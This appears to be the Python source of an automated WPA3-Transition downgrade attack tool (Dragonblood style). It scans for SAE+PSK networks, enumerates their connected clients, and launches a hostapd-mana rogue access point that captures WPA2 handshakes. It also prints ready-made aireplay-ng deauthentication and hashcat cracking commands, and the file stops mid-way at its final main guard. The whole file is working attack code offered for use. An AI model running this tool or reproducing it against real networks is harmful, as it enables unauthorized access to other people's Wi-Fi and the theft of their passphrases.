import os
import sys
import subprocess
import time
import csv
import glob
import datetime
import argparse
from scapy.all import rdpcap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11
from collections import defaultdict
from colorama import Fore, Style, init

init(autoreset=True)


def check_root():
    if os.geteuid() != 0:
        print("[-] This script must be run with root privileges. Use sudo.")
        sys.exit(1)

def check_tools():
    tools = [
        'ip',
        'iw',
        'airodump-ng',
        'airmon-ng',
        'hostapd-mana'
    ]

    missing_tools = []
    for tool in tools:
        if not any(
            os.access(os.path.join(path, tool), os.X_OK) 
            for path in os.environ['PATH'].split(os.pathsep)
        ):
            missing_tools.append(tool)

    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        sys.exit(1)
    else:
        print("[+] All required tools are present.")

def check_interface_exists(interface):
    try:
        result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[-] Interface {interface} does not exist. Please check the interface name.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error checking interface : {e}")
        sys.exit(1)

def check_monitor_mode(interface):
    try:
        result = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True)
        if 'type monitor' in result.stdout:
            print(f"[+] The {interface} interface is in monitor mode. Starting Airodump-ng.")
        else:
            print(f"[-] Interface {interface} is not in monitor mode. Please configure it in monitor mode to continue.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error checking if interface is in monitor mode : {e}")
        sys.exit(1)

def check_managed_mode(interface):
    check_interface_exists(interface)
    try:
        result = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True)
        if 'type managed' in result.stdout:
            return True
        else:
            print(f"[-] Interface {interface} is not in managed mode. Please configure it in managed mode.")
            return False
    except Exception as e:
        print(f"[-] Error checking interface {interface} : {e}")
        return False

def set_managed_mode(interface):
    new_interface_name = interface
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while new_interface_name.endswith('mon'):
            new_interface_name = new_interface_name[:-3]  

        subprocess.run(['ip', 'link', 'set', interface, 'name', new_interface_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['iw', 'dev', new_interface_name, 'set', 'type', 'managed'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', new_interface_name, 'up'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"\n[+] The {new_interface_name} interface is now in Managed mode.")
        return new_interface_name
    except subprocess.CalledProcessError as e:
        print(f"[-] Error configuring {interface} in Managed mode: {e}")
        sys.exit(1)

def create_scan_directory():
    now = datetime.datetime.now()
    folder_name = now.strftime("scan-%Y-%m-%d-%H-%M")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def run_airodump(interface, folder_name):
    try:
        print(f"[+] Airodump-ng is running on interface {interface} for 1 minute...")
        airodump_cmd = [
            'airodump-ng', interface,
            '-w', f'{folder_name}/discovery',
            '--output-format', 'pcap',
            '--manufacturer', '--wps', '--band', 'abg'
        ]
        with open(os.devnull, 'w') as FNULL:
            airodump_process = subprocess.Popen(airodump_cmd, stdout=FNULL, stderr=FNULL)
            time.sleep(60)
            airodump_process.terminate()
        print(f"[+] Capture done. Files are saved under '{folder_name}/discovery'.")
    except Exception as e:
        print(f"[-] Error during airodump-ng execution : {e}")
        sys.exit(1)

def parse_rsn_info(rsn_info):
    version = "Unknown"
    ciphers = []
    auths = []
    mfp = "Inactive"
    
    try:
        rsn_version = int.from_bytes(rsn_info[0:2], byteorder='little')
        if rsn_version == 1:
            version = "WPA2"
        elif rsn_version == 2:
            version = "WPA3"
        
        cipher_suite_count = int.from_bytes(rsn_info[6:8], byteorder='little')
        for i in range(cipher_suite_count):
            cipher_suite = rsn_info[8 + i*4:12 + i*4]
            if cipher_suite[3] == 2:
                ciphers.append("TKIP")
            elif cipher_suite[3] == 4:
                ciphers.append("CCMP")
            elif cipher_suite[3] == 8:
                ciphers.append("GCMP")
        
        cipher_offset = 8 + cipher_suite_count * 4
        akm_suite_count = int.from_bytes(rsn_info[cipher_offset:cipher_offset+2], byteorder='little')
        
        for i in range(akm_suite_count):
            akm_suite = rsn_info[cipher_offset + 2 + i*4:cipher_offset + 2 + (i+1)*4]
            if akm_suite[3] == 1:
                auths.append("802.1X")
            elif akm_suite[3] == 2:
                auths.append("PSK")
            elif akm_suite[3] == 8:
                auths.append("SAE")
                version = "WPA3"
        
        # Check for MFP (Management Frame Protection)
        rsn_capabilities_offset = cipher_offset + 2 + akm_suite_count * 4
        if len(rsn_info) >= rsn_capabilities_offset + 2:
            rsn_capabilities = int.from_bytes(rsn_info[rsn_capabilities_offset:rsn_capabilities_offset+2], byteorder='little')
            if rsn_capabilities & 0b01000000:
                mfp = "Optional"
            if rsn_capabilities & 0b10000000:
                mfp = "Required"
                
    except Exception as e:
        print(f"[-] Error parsing RSN info: {e}")
    
    return version, ", ".join(ciphers), ", ".join(auths), mfp

def get_security_info(packet):
    ssid = ""
    try:
        ssid = packet[Dot11Elt].info.decode(errors="ignore")
    except:
        ssid = "Hidden"
    
    rsn_info = None
    wpa_info = None
    
    elt = packet[Dot11Elt]
    while elt:
        if elt.ID == 48:  # RSN Information (WPA2/WPA3)
            rsn_info = elt.info
        elif elt.ID == 221 and elt.info.startswith(b'\x00P\xf2\x01\x01\x00'):  # WPA Information (WPA)
            wpa_info = elt.info
        elt = elt.payload.getlayer(Dot11Elt)
    
    if rsn_info:
        version, cipher, auth, mfp = parse_rsn_info(rsn_info)
    elif wpa_info:
        version, cipher, auth, mfp = "WPA", "TKIP", "PSK", "Inactive"
    else:
        # Open network or unknown security
        version, cipher, auth, mfp = "Open", "None", "None", "Inactive"
    
    return ssid, version, cipher, auth, mfp

def extract_channel(packet):
    channel = None
    if packet.haslayer(Dot11Beacon):
        beacon = packet[Dot11Beacon]
        try:
            channel = beacon.channel
        except AttributeError:
            pass
    elif packet.haslayer(Dot11ProbeResp):
        probe_resp = packet[Dot11ProbeResp]
        try:
            channel = probe_resp.channel
        except AttributeError:
            pass
    
    # Try to extract channel from RadioTap header
    if hasattr(packet, 'channel'):
        channel = packet.channel
    elif hasattr(packet, 'Channel'):
        channel = packet.Channel
    
    return channel

def analyze_pcap(file):
    print(f"[+] Analyzing PCAP file: {file}")
    packets = rdpcap(file)
    ssid_info = defaultdict(list)

    ap_count = 0
    for packet in packets:
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            ssid, version, cipher, auth, mfp = get_security_info(packet)
            channel = extract_channel(packet)
            bssid = packet[Dot11].addr3

            # Only add if we haven't seen this BSSID before
            if bssid not in [ap["BSSID"] for ap in ssid_info[ssid]]:
                ssid_info[ssid].append({
                    "Version": version,
                    "Cipher": cipher,
                    "Auth": auth,
                    "MFP": mfp,
                    "BSSID": bssid,
                    "Channel": channel
                })
                ap_count += 1
    
    print(f"[+] Found {ap_count} unique access points")
    
    # Display all APs found for debugging
    print(f"\n[+] All APs found:")
    for ssid, details in ssid_info.items():
        for detail in details:
            print(f"  - SSID: {ssid}, BSSID: {detail['BSSID']}, Auth: {detail['Auth']}, Version: {detail['Version']}, MFP: {detail['MFP']}")
    
    vulnerable_aps = []
    
    # Improved vulnerability detection
    for ssid, details in ssid_info.items():
        for detail in details:
            # WPA3 Transition mode detection - look for networks that support both SAE and PSK
            if "SAE" in detail["Auth"]:
                print(f"[!] Found WPA3-SAE network: {ssid}")
                
                # Check if it's vulnerable to transition attacks
                if "PSK" in detail["Auth"]:
                    print(f"[!] Found WPA3 Transition network (SAE+PSK): {ssid}")
                    vulnerable_aps.append({
                        "SSID": ssid,
                        "BSSID": detail["BSSID"],
                        "Channel": detail["Channel"],
                        "Version": detail["Version"],
                        "Cipher": detail["Cipher"],
                        "Auth": detail["Auth"],
                        "MFP": detail["MFP"],
                        "Vulnerability": "WPA3 Transition (SAE+PSK)"
                    })
                elif detail["MFP"] == "Inactive" or detail["MFP"] == "Optional":
                    print(f"[!] Found WPA3 network with weak MFP: {ssid}")
                    vulnerable_aps.append({
                        "SSID": ssid,
                        "BSSID": detail["BSSID"],
                        "Channel": detail["Channel"],
                        "Version": detail["Version"],
                        "Cipher": detail["Cipher"],
                        "Auth": detail["Auth"],
                        "MFP": detail["MFP"],
                        "Vulnerability": "WPA3 with weak MFP"
                    })
    
    if not vulnerable_aps:
        print("[-] No vulnerable WPA3 Transition APs were found.")
        print("[!] This could be because:")
        print("    - No WPA3 networks are in range")
        print("    - WPA3 networks have strong MFP enabled")
        print("    - WPA3 networks don't support transition mode (PSK fallback)")
        return vulnerable_aps
    
    # Display vulnerable APs
    print(f"\n[+] Found {len(vulnerable_aps)} vulnerable APs:")
    for ap in vulnerable_aps:
        print(f"\n[{Fore.RED}VULNERABLE AP DETECTED{Style.RESET_ALL}] :")
        print(f"  - SSID: {ap['SSID']}")
        print(f"  - BSSID: {ap['BSSID']}")
        print(f"  - Channel: {ap['Channel']}")
        print(f"  - Security: {ap['Version']}")
        print(f"  - Authentication: {ap['Auth']}")
        print(f"  - MFP: {ap['MFP']}")
        print(f"  - Vulnerability: {ap['Vulnerability']}")
    
    return vulnerable_aps

def select_vulnerable_aps(vulnerable_aps):
    """Allow user to select which vulnerable APs to target"""
    if not vulnerable_aps:
        return []
    
    print(f"\n{Fore.YELLOW}[!] VULNERABLE AP SELECTION{Style.RESET_ALL}")
    print("=" * 50)
    
    # Display numbered list of vulnerable APs
    for i, ap in enumerate(vulnerable_aps, 1):
        print(f"\n{Fore.CYAN}[{i}]{Style.RESET_ALL} {ap['SSID']}")
        print(f"     BSSID: {ap['BSSID']}")
        print(f"     Channel: {ap['Channel']}")
        print(f"     Security: {ap['Version']}")
        print(f"     Auth: {ap['Auth']}")
        print(f"     MFP: {ap['MFP']}")
        print(f"     Vulnerability: {ap['Vulnerability']}")
    
    print(f"\n{Fore.YELLOW}[!] SELECTION OPTIONS:{Style.RESET_ALL}")
    print("  - Enter AP numbers separated by commas (e.g., 1,3,5)")
    print("  - Enter 'all' to target all vulnerable APs")
    print("  - Enter 'none' to skip all APs")
    
    while True:
        try:
            selection = input(f"\n{Fore.GREEN}[?] Select APs to target: {Style.RESET_ALL}").strip().lower()
            
            if selection == 'all':
                print("[+] Selected all vulnerable APs for attack")
                return vulnerable_aps
            elif selection == 'none':
                print("[-] No APs selected. Exiting.")
                return []
            else:
                # Parse comma-separated numbers
                selected_indices = []
                for num in selection.split(','):
                    num = num.strip()
                    if num.isdigit():
                        index = int(num) - 1
                        if 0 <= index < len(vulnerable_aps):
                            selected_indices.append(index)
                        else:
                            print(f"[-] Invalid AP number: {num}. Please enter numbers between 1 and {len(vulnerable_aps)}")
                            break
                    else:
                        print(f"[-] Invalid input: {num}. Please enter numbers separated by commas")
                        break
                else:
                    # If no break occurred in the loop
                    if selected_indices:
                        selected_aps = [vulnerable_aps[i] for i in selected_indices]
                        print(f"[+] Selected {len(selected_aps)} AP(s) for attack:")
                        for ap in selected_aps:
                            print(f"    - {ap['SSID']} ({ap['BSSID']})")
                        return selected_aps
                    else:
                        print("[-] No valid APs selected. Please try again.")
        except KeyboardInterrupt:
            print("\n[-] Selection cancelled by user. Exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error during selection: {e}. Please try again.")

def capture_stations(interface, ap, folder_name):
    try:
        print(f"\n[+] Starting airodump-ng on {ap['SSID']} ({ap['BSSID']}) with channel {ap['Channel']} for 30 seconds...")
        airodump_cmd = [
            'airodump-ng',
            '-c', str(ap['Channel']),
            '--bssid', ap['BSSID'],
            '-a',
            '-w', f"{folder_name}/{ap['SSID']}-station",
            '--output-format', 'csv',
            interface
        ]
        with open(os.devnull, 'w') as FNULL:
            airodump_process = subprocess.Popen(airodump_cmd, stdout=FNULL, stderr=FNULL)
            time.sleep(30)
            airodump_process.terminate()
        print(f"[+] Capture done for {ap['SSID']}. CSV files are saved under : {folder_name}/{ap['SSID']}-station.csv")
    except Exception as e:
        print(f"[-] Error capturing stations for {ap['SSID']} : {e}")

def analyze_station_files(folder_name, ap_ssid):
    ap_file = f"{folder_name}/{ap_ssid}-station-01.csv"
    try:
        with open(ap_file, 'r') as f:
            reader = csv.reader(f)
            lines = list(reader)
            
            stations = []
            start_reading = False
            for line in lines:
                if 'Station MAC' in line:
                    start_reading = True
                    continue
                
                if start_reading and line:
                    station_mac = line[0].strip()
                    if station_mac:
                        stations.append(station_mac)
        
        if stations:
            print(f"\n[+] Connected stations on {ap_ssid}:")
            for station in stations:
                print(f"  - Station MAC: {station}")
            return stations
        else:
            print(f"\n[!] No connected station found on {ap_ssid}.")
            return []
    except FileNotFoundError:
        print(f"[-] The file for AP {ap_ssid} was not found.")
        return []
    except Exception as e:
        print(f"[-] Error parsing file for AP {ap_ssid} : {e}")
        return []

def create_config_file(folder_name, ap, managed_interface):
    abs_folder_name = os.path.abspath(folder_name)
    config_content = f"""interface={managed_interface}
driver=nl80211
hw_mode=g
channel={ap['Channel']}
ssid={ap['SSID']}
mana_wpaout={abs_folder_name}/{ap['SSID']}-handshake.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
"""
    config_file = os.path.join(abs_folder_name, f"{ap['SSID']}-sae.conf")
    try:
        with open(config_file, 'w') as f:
            f.write(config_content)
        print(f"[+] Hostapd configuration file created: {config_file}")
        return config_file
    except Exception as e:
        print(f"[-] Error creating Hostapd configuration file: {e}")
        return None

def start_attack(config_file, checker):
    if not config_file:
        return

    try:
        print(f"\n[+] Starting Rogue AP with hostapd-mana...")
        if checker:
            print(f"[!] DragonShift is now in passive mode, waiting for stations to connect on our rogue AP...\n")
        else:
            print(f"[+] Open a new terminal and run a deauth attack against the vulnerable AP and the connected client")
            print(f"[!] For deauth attack, you can use aireplay-ng like this : aireplay-ng <MONITOR INTERFACE> -0 5 -a <AP BSSID> -c <STATION MAC>\n")

        process = subprocess.Popen(['hostapd-mana', config_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())
                
                if "Captured a WPA/2 handshake from" in output:
                    print(f"\n{Fore.GREEN}[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).{Style.RESET_ALL}")
                    print("[+] Run hashcat using mode 2500 to crack the handshake")
                    print("[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force")
                    process.terminate()
                    break
        
        stderr = process.stderr.read()
        if stderr:
            print("[-] Errors from hostapd-mana :")
            print(stderr)
        
        return_code = process.poll()
        if return_code != 0:
            print(f"[-] Attack failed with return code : {return_code}")
    except Exception as e:
        print(f"[-] Error during hostapd-mana execution : {e}")

def do_stuff(interface, managed_interface, checker):
    
    check_root()
    check_tools()
    check_interface_exists(interface)
    check_interface_exists(managed_interface)
    check_monitor_mode(interface)
    
    folder_name = create_scan_directory()
    
    run_airodump(interface, folder_name)

    pcap_files = [f for f in os.listdir(folder_name) if f.startswith('discovery') and (f.endswith('.pcap') or f.endswith('.cap'))]
    all_vulnerable_aps = []

    for pcap_file in pcap_files:
        file_path = os.path.join(folder_name, pcap_file)
        vulnerable_aps = analyze_pcap(file_path)
        all_vulnerable_aps.extend(vulnerable_aps)
    
    if not all_vulnerable_aps:
        print("[-] No vulnerable APs found. Exiting.")
        sys.exit(1)
    
    # Let user select which APs to target
    selected_aps = select_vulnerable_aps(all_vulnerable_aps)
    
    if not selected_aps:
        print("[-] No APs selected for attack. Exiting.")
        sys.exit(1)
    
    created_files = []
    all_stations = {}

    for ap in selected_aps:
        capture_stations(interface, ap, folder_name)
        stations = analyze_station_files(folder_name, ap['SSID'])
        all_stations[ap['SSID']] = stations

    if checker:
        new_interface_name = set_managed_mode(managed_interface)

    for ap in selected_aps:
        stations = all_stations.get(ap['SSID'], [])
        
        if stations:
            if checker:
                config_file = create_config_file(folder_name, ap, new_interface_name)
            else:
                config_file = create_config_file(folder_name, ap, managed_interface)
            if config_file:
                created_files.append(config_file)
        else:
            print(f"[!] Skipping hostapd configuration file creation for AP {ap['SSID']} because no stations were found.")
    
    if not created_files:
        print("[!] No valid configuration files created. Exiting program.")
        sys.exit(1)
    
    while True:
        consent = input("[!] Stations are connected. Would you like to start the attack? (y/n) ").strip().lower()
        
        if consent == 'y':
            for config_file in created_files:
                start_attack(config_file, checker)
            break
        elif consent == 'n':
            print("[!] Attack aborted. Exiting program.")
            sys.exit(0)
        else:
            print("[!] Invalid input. Please enter 'y' to start the attack or 'n' to abort.")


def main():
    parser = argparse.ArgumentParser(
        description="Automated WPA3-Transition Downgrade Attack Tool (Dragonblood)."
    )

    parser.add_argument(
        "-m", "--monitor",
        dest="monitor_interface",
        type=str,
        required=True,
        help="Interface to use in monitor mode."
    )
    parser.add_argument(
        "-r", "--rogue",
        dest="rogueAP_interface",
        type=str,
        required=False,
        help="Interface to use for Rogue AP during hostapd-mana launch."
    )

    args = parser.parse_args()

    monitor_interface = args.monitor_interface
    managed_interface = args.rogueAP_interface if args.rogueAP_interface else monitor_interface
    
    if args.monitor_interface and not args.rogueAP_interface:
        checker = True
        print("[!] WARNING : Only the monitor mode interface has been provided.\n"
              "The script will run in passive mode, meaning you won't be able to manually force stations to reconnect to the rogue AP. For better handshake capture, it's STRONGLY RECOMMENDED to use two interfaces: one in monitor mode for scanning and manual deauthentication, and another in managed mode to launch the rogue AP.")
        while True:
            consent = input("[!] Would you like to continue ? (y/n) ").strip().lower()
            if consent == 'y':
                do_stuff(monitor_interface, managed_interface, checker)
                sys.exit(0)
            elif consent == 'n':
                print("[!] Attack aborted. Exiting program.")
                sys.exit(0)
            else:
                print("[!] Invalid input. Please enter 'y' to continue or 'n' to abort.")
    else:
        checker = False
        if check_managed_mode(managed_interface):
            do_stuff(monitor_interface, managed_interface, checker)

if __name__ == "__main__":
